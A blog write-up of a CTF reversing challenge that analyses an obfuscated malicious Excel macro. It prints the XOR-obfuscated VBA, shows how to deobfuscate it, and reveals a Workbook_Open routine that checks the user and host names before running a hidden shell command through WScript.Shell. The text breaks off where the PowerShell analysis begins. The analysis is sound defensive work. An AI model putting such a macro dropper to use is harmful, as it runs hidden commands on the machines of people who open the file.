<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Excel macro -Mallux </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Analyze a malicious Excel file and extract its payload- Excel macro"> <meta name="keywords" content="Excel macro, Mallux, Reversing, Windows_Reversing, Forensics,Windows Reversing, Reversing, Forensics, Excel, VBA"/> <meta content="" property="fb:app_id" /> <meta content="Mallux" property="og:site_name" /> <meta content="Excel macro" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Analyze a malicious Excel file and extract its payload" property="og:description" /> <meta content="/blog/excel-macro/" property="og:url" /> <meta content="2021-03-01T18:00:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="/assets/img/posts/excel-macro/excel.png" property="og:image" /> <meta content="Reversing" property="article:section" /> <meta content="Windows" property="article:tag" /> <meta content="Reversing," property="article:tag" /> <meta content="Reversing," property="article:tag" /> <meta content="Forensics," property="article:tag" /> <meta content="Excel," property="article:tag" /> <meta content="VBA" property="article:tag" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Excel macro" /> <meta name="twitter:url" content="/blog/excel-macro/" /> <meta name="twitter:description" content="Analyze a malicious Excel file and extract its payload" /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <!-- for Mathjax support --> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Mallux</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="col-lg-12"> <div class="row" id="blog-post-container"> <div class="col-lg-8 offset-md-2"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Excel macro</h1> <h4 class="post-meta">Analyze a malicious Excel file and extract its payload</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/trigleos">trigleos</a></span> </span > at <time datetime="2021-03-01 18:00:00 +0000" itemprop="datePublished" >Mar 1, 2021</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/excel-macro/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/Reversing" >Reversing</a > &nbsp; <a href="/blog/categories/Windows_Reversing" >Windows_Reversing</a > &nbsp; <a href="/blog/categories/Forensics" >Forensics</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top" src="/assets/img/posts/excel-macro/excel.png" alt="" /> <br /> <br /> <h1 id="сука-блять">сука блять</h1> <h2 id="tldr">TL;DR</h2> <p>Analyze a malicious Excel file and extract its payload</p> <h2 id="description">Description</h2> <p>I found some Russian malware online and I have no idea what it’s doing D:</p> <p>Author: xenocidewiki</p> <p>The challenge provides us with a Finances2020covid.xlsm file</p> <h2 id="initial-analysis">Initial analysis</h2> <p>First of all, when you download this file, Microsoft Defender warns you that it is malware. I guess that the author took a malware sample and removed the actual malicious part to create this challenge which is why Defender blocks it. In a real world scenario, you wouldn’t simply open the file or even keep it on your computer. The .xlsm hints indeed to a macro-infused excel file, which is commonly used as an initial infection vector. You can easily extract the macro with oledump and analyze it safely if you want to be sure that the macro is not dangerous. In this case however, I’ll simply open it with excel and see what it contains.</p> <p><img src="/assets/img/posts/excel-macro/excel1.png" alt="excel" /></p> <p>When we first open it, we see this big image that asks us to “enable editing”. Again,you should never do this in a real world sceanrio because this allows the macro to run but in this case, it’s safe to enable editing. After that, we get another warning that tells us that macros are deactivated. Again,activate them so we can solve this challenge. When we do this, a message box appears containing the words <strong>Thank you!</strong> Now let’s analyze the macro code in detail.</p> <h2 id="macro-analysis">Macro analysis</h2> <p>To see the macro code in Excel, click on the Developer Tab (you may need to activate this if you haven’t used it before) and pick Visual Basic. You can now see a big chunk of code written in VBA (I included a shortened version here so you get the gist of the obfuscation).</p> <div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Private</span> <span class="k">Function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span> <span class="ow">As</span> <span class="kt">Variant</span><span class="p">,</span> <span class="n">key</span> <span class="ow">As</span> <span class="kt">Variant</span><span class="p">)</span>
    <span class="k">Dim</span> <span class="nv">plaintext</span> <span class="ow">As</span> <span class="kt">String</span>
    <span class="n">plaintext</span> <span class="o">=</span> <span class="s">""</span>
    
    <span class="k">For</span> <span class="n">i</span> <span class="o">=</span> <span class="n">LBound</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span> <span class="k">To</span> <span class="n">UBound</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">plaintext</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">Xor</span> <span class="n">ciphertext</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="k">Next</span>
    <span class="n">decrypt</span> <span class="o">=</span> <span class="n">plaintext</span>
<span class="k">End</span> <span class="k">Function</span>
<span class="k">Private</span> <span class="k">Function</span> <span class="nf">SKDKLNWEio2nf</span><span class="p">()</span>
<span class="k">Dim</span> <span class="nv">wsh</span> <span class="ow">As</span> <span class="kt">Object</span>

<span class="k">Set</span> <span class="n">wsh</span> <span class="o">=</span> <span class="n">VBA</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">Array</span><span class="p">(</span><span class="mi">202</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="p">(</span><span class="mi">92</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">241</span> <span class="o">-</span> <span class="mi">10</span><span class="p">)),</span> <span class="mi">215</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="p">(</span><span class="mi">135</span> <span class="o">+</span> <span class="mi">30</span><span class="p">),</span> <span class="p">(</span><span class="mi">318</span> <span class="o">-</span> <span class="mi">110</span><span class="p">),</span> <span class="p">(</span><span class="mi">279</span> <span class="o">-</span> <span class="mi">92</span><span class="p">),</span> <span class="p">(</span><span class="mi">92</span> <span class="o">-</span> <span class="mi">24</span><span class="p">),</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="p">((</span><span class="mi">7</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">74</span><span class="p">)),</span> <span class="n">Array</span><span class="p">((</span><span class="mi">124</span> <span class="ow">Xor</span> <span class="p">((</span><span class="mi">247</span> <span class="o">-</span> <span class="mi">82</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">103</span> <span class="o">-</span> <span class="mi">43</span><span class="p">))),</span> <span class="p">(</span><span class="mi">24</span> <span class="o">-</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">165</span><span class="p">,</span> <span class="p">((</span><span class="mi">0</span> <span class="o">+</span> <span class="p">(</span><span class="mi">24</span> <span class="o">-</span> <span class="mi">12</span><span class="p">))</span> <span class="ow">Xor</span> <span class="mi">62</span><span class="p">),</span> <span class="p">(</span><span class="mi">271</span> <span class="o">-</span> <span class="mi">47</span><span class="p">),</span> <span class="p">(</span><span class="mi">170</span> <span class="ow">Xor</span> <span class="mi">123</span><span class="p">),</span> <span class="p">(</span><span class="mi">76</span> <span class="ow">Xor</span> <span class="mi">178</span><span class="p">),</span> <span class="p">(</span><span class="mi">356</span> <span class="o">-</span> <span class="mi">124</span><span class="p">),</span> <span class="p">((</span><span class="mi">11</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">37</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">10</span><span class="p">),</span> <span class="mi">118</span><span class="p">,</span> <span class="p">(</span><span class="mi">48</span> <span class="o">-</span> <span class="mi">13</span><span class="p">))))</span>

<span class="k">Dim</span> <span class="nv">wortn</span> <span class="ow">As</span> <span class="kt">Boolean</span><span class="p">:</span> <span class="n">wortn</span> <span class="o">=</span> <span class="k">True</span>

<span class="k">Dim</span> <span class="nv">wndstyle</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">:</span> <span class="n">wndstyle</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">0</span> <span class="o">+</span> <span class="p">(</span><span class="mi">0</span> <span class="o">-</span> <span class="mi">0</span><span class="p">)))</span>

<span class="k">Dim</span> <span class="nv">knlkdneKLADSFLKNfMKWEMLFAS123123njk</span> <span class="ow">As</span> <span class="kt">String</span>

<span class="n">knlkdneKLADSFLKNfMKWEMLFAS123123njk1</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">Array</span><span class="p">(((</span><span class="mi">51</span> <span class="o">+</span> <span class="mi">171</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)),</span> <span class="p">(</span><span class="mi">228</span> <span class="o">-</span> <span class="mi">7</span><span class="p">),</span> <span class="p">(</span><span class="mi">131</span> <span class="ow">Xor</span> <span class="mi">43</span><span class="p">),</span> <span class="p">(</span><span class="mi">19</span> <span class="ow">Xor</span> <span class="mi">11</span><span class="p">),</span> <span class="p">(</span><span class="mi">132</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">31</span> <span class="o">+</span> <span class="p">(</span><span class="mi">132</span> <span class="o">-</span> <span class="mi">47</span><span class="p">))),</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="p">(</span><span class="mi">151</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="mi">31</span><span class="p">)),</span> <span class="p">(</span><span class="mi">123</span> <span class="o">-</span> <span class="mi">3</span><span class="p">),</span> <span class="p">((</span><span class="mi">167</span> <span class="o">-</span> <span class="mi">73</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">418</span> <span class="o">-</span> <span class="mi">202</span><span class="p">)),</span> <span class="p">(</span><span class="mi">188</span> <span class="o">-</span> <span class="mi">18</span><span class="p">)),</span> <span class="n">Array</span><span class="p">(</span><span class="mi">153</span><span class="p">,</span> <span class="p">(</span><span class="mi">64</span> <span class="ow">Xor</span> <span class="p">((</span><span class="mi">152</span> <span class="o">-</span> <span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="mi">97</span><span class="p">)),</span> <span class="p">(((</span><span class="mi">19</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">41</span> <span class="o">-</span> <span class="mi">18</span><span class="p">))</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">227</span><span class="p">)),</span> <span class="mi">56</span><span class="p">,</span> <span class="p">(</span><span class="mi">204</span> <span class="o">+</span> <span class="p">(</span><span class="mi">23</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)),</span> <span class="p">(</span><span class="mi">143</span> <span class="o">+</span> <span class="p">(</span><span class="mi">212</span> <span class="o">-</span> <span class="mi">101</span><span class="p">)),</span> <span class="p">(</span><span class="mi">69</span> <span class="o">-</span> <span class="mi">24</span><span class="p">),</span> <span class="p">((</span><span class="mi">26</span> <span class="o">+</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="mi">2</span><span class="p">))</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">68</span> <span class="o">+</span> <span class="mi">61</span><span class="p">)),</span> <span class="p">(</span><span class="mi">49</span> <span class="ow">Xor</span> <span class="mi">7</span><span class="p">),</span> <span class="p">((</span><span class="mi">199</span> <span class="o">-</span> <span class="mi">58</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">36</span><span class="p">),</span> <span class="p">(</span><span class="mi">322</span> <span class="o">-</span> <span class="mi">97</span><span class="p">)))</span>
<span class="n">knlkdneKLADSFLKNfMKWEMLFAS123123njk2</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">wsh</span><span class="p">.</span><span class="n">Run</span> <span class="n">knlkdneKLADSFLKNfMKWEMLFAS123123njk1</span> <span class="o">&amp;</span> <span class="n">knlkdneKLADSFLKNfMKWEMLFAS123123njk2</span> <span class="o">&amp;</span> <span class="n">knlkdneKLADSFLKNfMKWEMLFAS123123njk3</span> <span class="o">&amp;</span> <span class="n">knlkdneKLADSFLKNfMKWEMLFAS123123njk32</span> <span class="o">&amp;</span>
<span class="k">End</span> <span class="k">Function</span>
<span class="k">Private</span> <span class="k">Sub</span> <span class="nf">Workbook_Open</span><span class="p">()</span>

<span class="k">Dim</span> <span class="nv">uname</span> <span class="ow">As</span> <span class="kt">String</span>
<span class="k">Dim</span> <span class="nv">strCompName</span> <span class="ow">As</span> <span class="kt">String</span>
<span class="n">uname</span> <span class="o">=</span> <span class="n">Application</span><span class="p">.</span><span class="n">UserName</span>
<span class="n">hostname</span> <span class="o">=</span> <span class="n">Environ</span><span class="err">$</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">Array</span><span class="p">((((</span><span class="mi">17</span> <span class="o">-</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">72</span><span class="p">),</span> <span class="p">((</span><span class="mi">19</span> <span class="o">+</span> <span class="mi">141</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="p">(</span><span class="mi">118</span> <span class="o">-</span> <span class="mi">46</span><span class="p">))),</span> <span class="p">(</span><span class="mi">114</span> <span class="o">+</span> <span class="p">(</span><span class="mi">85</span> <span class="o">-</span> <span class="mi">39</span><span class="p">)),</span> <span class="p">((</span><span class="mi">156</span> <span class="o">-</span> <span class="mi">61</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">44</span><span class="p">),</span> <span class="p">(</span><span class="mi">90</span> <span class="ow">Xor</span> <span class="p">((</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)),</span> <span class="mi">176</span><span class="p">,</span> <span class="p">(</span><span class="mi">12</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">73</span> <span class="o">-</span> <span class="mi">27</span><span class="p">)),</span> <span class="mi">150</span><span class="p">,</span> <span class="p">(</span><span class="mi">100</span> <span class="ow">Xor</span> <span class="mi">189</span><span class="p">),</span> <span class="mi">106</span><span class="p">,</span> <span class="p">((</span><span class="mi">49</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">152</span> <span class="o">-</span> <span class="mi">70</span><span class="p">)),</span> <span class="p">(</span><span class="mi">8</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">49</span> <span class="o">-</span> <span class="mi">15</span><span class="p">))),</span> <span class="n">Array</span><span class="p">(</span><span class="mi">59</span><span class="p">,</span> <span class="p">((</span><span class="mi">121</span> <span class="o">-</span> <span class="mi">60</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">189</span><span class="p">),</span> <span class="p">((</span><span class="mi">31</span> <span class="o">+</span> <span class="p">(</span><span class="mi">43</span> <span class="o">-</span> <span class="mi">5</span><span class="p">))</span> <span class="ow">Xor</span> <span class="mi">136</span><span class="p">),</span> <span class="mi">14</span><span class="p">,</span> <span class="p">(</span><span class="mi">135</span> <span class="o">-</span> <span class="mi">56</span><span class="p">))))</span>

<span class="k">If</span> <span class="n">uname</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">Array</span><span class="p">(</span><span class="mi">161</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="p">(</span><span class="mi">157</span> <span class="o">-</span> <span class="mi">30</span><span class="p">),</span> <span class="p">(</span><span class="mi">12</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">65</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)),</span> <span class="p">((</span><span class="mi">416</span> <span class="o">-</span> <span class="mi">192</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="mi">6</span><span class="p">)),</span> <span class="p">(</span><span class="mi">349</span> <span class="o">-</span> <span class="mi">157</span><span class="p">),</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">138</span><span class="p">),</span> <span class="n">Array</span><span class="p">(</span><span class="mi">215</span><span class="p">,</span> <span class="mi">224</span><span class="p">,</span> <span class="p">(</span><span class="mi">44</span> <span class="o">-</span> <span class="mi">17</span><span class="p">),</span> <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">32</span><span class="p">),</span> <span class="mi">139</span><span class="p">,</span> <span class="p">(</span><span class="mi">212</span> <span class="o">-</span> <span class="mi">39</span><span class="p">),</span> <span class="mi">163</span><span class="p">,</span> <span class="p">(((</span><span class="mi">75</span> <span class="o">-</span> <span class="mi">24</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">19</span> <span class="o">-</span> <span class="mi">6</span><span class="p">))</span> <span class="ow">Xor</span> <span class="mi">164</span><span class="p">)))</span> <span class="k">Then</span>
   <span class="p">.</span><span class="err">..</span>
    <span class="n">End</span> <span class="k">If</span>
<span class="k">Else</span>
    <span class="n">MsgBox</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">Array</span><span class="p">(</span><span class="mi">36</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">12</span><span class="p">),</span> <span class="p">(</span><span class="mi">21</span> <span class="o">+</span> <span class="mi">104</span><span class="p">),</span> <span class="p">(</span><span class="mi">40</span> <span class="o">+</span> <span class="p">(</span><span class="mi">13</span> <span class="o">-</span> <span class="mi">0</span><span class="p">)),</span> <span class="mi">77</span><span class="p">,</span> <span class="p">((</span><span class="mi">31</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="mi">11</span><span class="p">)),</span> <span class="mi">239</span><span class="p">,</span> <span class="p">(</span><span class="mi">31</span> <span class="ow">Xor</span> <span class="mi">63</span><span class="p">),</span> <span class="p">(</span><span class="mi">15</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span> <span class="mi">0</span><span class="p">),</span> <span class="n">Array</span><span class="p">((</span><span class="mi">103</span> <span class="ow">Xor</span> <span class="mi">23</span><span class="p">),</span> <span class="p">(((</span><span class="mi">53</span> <span class="o">-</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">90</span><span class="p">),</span> <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="p">(</span><span class="mi">24</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)),</span> <span class="mi">91</span><span class="p">,</span> <span class="p">((</span><span class="mi">48</span> <span class="o">-</span> <span class="mi">23</span><span class="p">)</span> <span class="o">+</span> <span class="mi">13</span><span class="p">),</span> <span class="p">(</span><span class="mi">70</span> <span class="o">-</span> <span class="mi">7</span><span class="p">),</span> <span class="mi">150</span><span class="p">,</span> <span class="p">((</span><span class="mi">12</span> <span class="o">-</span> <span class="mi">3</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">89</span> <span class="o">-</span> <span class="mi">19</span><span class="p">)),</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">33</span><span class="p">))</span>
<span class="k">End</span> <span class="k">If</span>

<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div> <p>We can clearly see that this code has been heavily obfuscated. Deobfuscating this is however not that hard. All you need is a few well-placed calls to MsgBox to see the values that are returned by all the decrypt functions. So for example, if you wanted to know what the parameter to the Environ$ call is, simply add</p> <div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MsgBox</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">Array</span><span class="p">((((</span><span class="mi">17</span> <span class="o">-</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">72</span><span class="p">),</span> <span class="p">((</span><span class="mi">19</span> <span class="o">+</span> <span class="mi">141</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="p">(</span><span class="mi">118</span> <span class="o">-</span> <span class="mi">46</span><span class="p">))),</span> <span class="p">(</span><span class="mi">114</span> <span class="o">+</span> <span class="p">(</span><span class="mi">85</span> <span class="o">-</span> <span class="mi">39</span><span class="p">)),</span> <span class="p">((</span><span class="mi">156</span> <span class="o">-</span> <span class="mi">61</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">44</span><span class="p">),</span> <span class="p">(</span><span class="mi">90</span> <span class="ow">Xor</span> <span class="p">((</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)),</span> <span class="mi">176</span><span class="p">,</span> <span class="p">(</span><span class="mi">12</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">73</span> <span class="o">-</span> <span class="mi">27</span><span class="p">)),</span> <span class="mi">150</span><span class="p">,</span> <span class="p">(</span><span class="mi">100</span> <span class="ow">Xor</span> <span class="mi">189</span><span class="p">),</span> <span class="mi">106</span><span class="p">,</span> <span class="p">((</span><span class="mi">49</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">152</span> <span class="o">-</span> <span class="mi">70</span><span class="p">)),</span> <span class="p">(</span><span class="mi">8</span> <span class="ow">Xor</span> <span class="p">(</span><span class="mi">49</span> <span class="o">-</span> <span class="mi">15</span><span class="p">))),</span> <span class="n">Array</span><span class="p">(</span><span class="mi">59</span><span class="p">,</span> <span class="p">((</span><span class="mi">121</span> <span class="o">-</span> <span class="mi">60</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">189</span><span class="p">),</span> <span class="p">((</span><span class="mi">31</span> <span class="o">+</span> <span class="p">(</span><span class="mi">43</span> <span class="o">-</span> <span class="mi">5</span><span class="p">))</span> <span class="ow">Xor</span> <span class="mi">136</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span> <span class="o">-</span> <span class="mi">0</span><span class="p">),</span> <span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">38</span><span class="p">),</span> <span class="p">(</span><span class="mi">329</span> <span class="o">-</span> <span class="mi">133</span><span class="p">),</span> <span class="p">(</span><span class="mi">19</span> <span class="o">+</span> <span class="mi">52</span><span class="p">),</span> <span class="p">((</span><span class="mi">188</span> <span class="o">-</span> <span class="mi">28</span><span class="p">)</span> <span class="o">+</span> <span class="mi">68</span><span class="p">),</span> <span class="p">(((</span><span class="mi">54</span> <span class="o">-</span> <span class="mi">25</span><span class="p">)</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="ow">Xor</span> <span class="mi">142</span><span class="p">),</span> <span class="p">((</span><span class="mi">3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">11</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)),</span> <span class="mi">14</span><span class="p">,</span> <span class="p">(</span><span class="mi">135</span> <span class="o">-</span> <span class="mi">56</span><span class="p">)))</span>
</code></pre></div></div> <p>to the script and the value will be shown to you when you run it. If we apply this technique for each obfuscated value in WorkBook_Open() function (the function that gets called when you open the excel file). We get the following cleaned up version:</p> <div class="language-visualbasic highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Private</span> <span class="k">Sub</span> <span class="nf">Workbook_Open</span><span class="p">()</span>

<span class="k">Dim</span> <span class="nv">uname</span> <span class="ow">As</span> <span class="kt">String</span>
<span class="k">Dim</span> <span class="nv">strCompName</span> <span class="ow">As</span> <span class="kt">String</span>
<span class="n">uname</span> <span class="o">=</span> <span class="n">Application</span><span class="p">.</span><span class="n">UserName</span>
<span class="n">hostname</span> <span class="o">=</span> <span class="n">Environ</span><span class="err">$</span><span class="p">(</span><span class="s">"computername"</span><span class="p">)</span>
<span class="k">If</span> <span class="n">uname</span> <span class="o">=</span> <span class="s">"vodkaman"</span> <span class="k">Then</span>
    <span class="k">If</span> <span class="n">hostname</span> <span class="o">=</span> <span class="s">"SIGINTCORP"</span> <span class="k">Then</span>
        <span class="k">Call</span> <span class="n">Success</span>
    <span class="k">Else</span>
        <span class="n">MsgBox</span> <span class="s">"Thank you!"</span>
    <span class="k">End</span> <span class="k">If</span>
<span class="k">Else</span>
    <span class="n">MsgBox</span> <span class="s">"Thank you!"</span>
<span class="k">End</span> <span class="k">If</span>

<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div></div> <p>Now this is much easier to analyze. The code gets our username and computername and then compares them to <strong>vodkaman</strong> and <strong>SIGINTCORP</strong> respectively. It then calls Success (I renamed SKDKLNWEio2nf to Success). So let’s see what happens if we call Success: <img src="/assets/img/posts/excel-macro/excel2.png" alt="powershell" /> It opens up a shell and runs some script that finishes after a few seconds and prints <em>woooops</em> Now let’s analyze the other function in the macro. There are two important parts in this code:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span><span class="w"> </span><span class="nx">wsh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VBA.CreateObject</span><span class="p">(</span><span class="n">WScript.Shell</span><span class="p">)</span><span class="w">
</span></code></pre></div></div> <p>This sets up the shell</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wsh.Run</span><span class="w"> </span><span class="o">...</span><span class="w">
</span></code></pre></div></div> <p>This sets up the command to run in the shell. If we print the parameters to this call, we get the powershell payload.</p> <h2 id="powershell-analysis">Powershell analysis</h2> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="w"> </span><span class="nx">/V:ON/Kset</span><span class="w"> </span><span class="nx">riMt</span><span class="o">=</span><span class="p">}</span><span class="w">
